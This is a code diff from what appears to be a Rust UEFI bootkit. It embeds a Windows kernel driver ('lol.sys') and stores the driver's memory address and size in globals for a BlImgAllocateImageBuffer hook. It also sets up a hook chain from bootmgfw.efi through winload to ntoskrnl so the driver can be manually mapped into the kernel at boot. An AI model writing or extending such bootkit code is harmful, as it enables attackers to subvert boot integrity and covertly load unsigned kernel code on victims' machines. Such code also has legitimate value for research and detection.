@@ -5,10 +5,10 @@
 #![feature(offset_of)]
 
 use log::{error, LevelFilter};
-use uefi::{prelude::*, table::boot::{AllocateType, MemoryType}};
+use uefi::{prelude::*};
+use crate::boot::globals::{DRIVER_ADDRESS, DRIVER_LENGTH};
 
 mod boot;
-use crate::boot::globals::DRIVER_MEMORY;
 
 #[lang = "eh_personality"]
 fn eh_personality() {}
@@ -64,17 +64,21 @@ fn efi_main(image_handle: Handle, system_table: SystemTable<Boot>) -> Status {
     let bootmgfw_handle = boot::pe::load_windows_boot_manager(boot_services).expect("Failed to load image");
     log::info!("[+] Image Loaded Successfully!");
 
-    // Read Windows kernel driver from disk as bytes
+    // Read Windows kernel driver from disk as bytes (save the address in a global variable for BlImgAllocateImageBuffer)
     let driver_bytes = include_bytes!("../../target/x86_64-pc-windows-msvc/debug/lol.sys");
-    
+    unsafe { DRIVER_ADDRESS = driver_bytes.as_ptr() as u64 };
+    unsafe { DRIVER_LENGTH = driver_bytes.len() as u64 };
+    log::info!("Driver address: {:#x}", unsafe { DRIVER_ADDRESS });
+    log::info!("Driver size: {:#x}", unsafe { DRIVER_LENGTH });
+
+    /* (Not requred if using above for BlImgAllocateImageBuffer)
     /* Allocates memory pages from the system for the Windows kernel driver to manually map*/
     unsafe {
-        DRIVER_MEMORY = Some(
-            boot_services.allocate_pages(AllocateType::AnyPages, MemoryType::RUNTIME_SERVICES_CODE, (driver_bytes.len() - 1) / 4096 + 1)
+        DRIVER_MEMORY = boot_services.allocate_pages(AllocateType::AnyPages, MemoryType::RUNTIME_SERVICES_CODE, (driver_bytes.len() - 1) / 4096 + 1)
             .expect("Failed to allocate memory pages")
-        );
     }
-    log::info!("Allocated memory pages for the driver at: {:#x}", unsafe { DRIVER_MEMORY.unwrap() });
+    log::info!("Allocated memory pages for the driver at: {:#x}", unsafe { DRIVER_MEMORY });
+    */
 
     /* Set up the hook chain from bootmgfw.efi -> windload.efi -> ntoskrnl.exe */
     boot::hooks::setup_hooks(&bootmgfw_handle, boot_services).expect("Failed to setup hooks");
